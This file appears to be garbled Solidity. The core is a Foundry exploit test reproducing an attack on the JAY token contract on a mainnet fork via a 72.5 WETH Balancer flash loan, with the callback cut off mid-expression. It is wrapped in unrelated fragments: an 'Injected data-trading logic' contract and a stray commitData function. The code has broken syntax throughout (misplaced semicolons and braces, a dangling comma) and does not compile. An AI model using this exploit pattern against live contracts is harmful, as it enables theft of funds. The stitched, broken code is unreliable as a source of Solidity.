
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity ^0.8.10;

;
;
interface IJay {
    function buyJay(address[] memory erc721TokenAddress,
        uint256[] memory erc721Ids,
        address[] memory erc1155TokenAddress,
        uint256[] memory erc1155Ids,
        uint256[] memory erc1155Amounts) external payable;
    function sell(uint256 value) external;
    function balanceOf(address account) external view returns (uint256)};
contract ContractTest is DSTest{
    IJay JAY = IJay(0xf2919D1D80Aff2940274014bef534f7791906FF2);
    IBalancerVault Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    WETH weth = WETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 16288199)};
    function testExploit() public {
        payable(address(0)).transfer(address(this).balance);
        emit log_named_decimal_uint("[Start] ETH balance before exploitation:",
            address(this).balance,;
            18);
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 72.5 ether;
        bytes memory b = "0x000000000000000000000000000000000000000000000001314fb3706298000000000000000000000000000000000000000000000000000000000000000030927f74c9de00000000000000000000000000000000000000000000000000000006f05b59d3b200000";
        Vault.flashLoan(address(this), tokens, amounts, b)};
    function receiveFlashLoan(IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData) external {
        require(msg.sender == address
function commitData(bytes32 dataHash) public {
    require(dataRecord[dataHash] == 0);
    dataRecord[dataHash] = block.timestamp}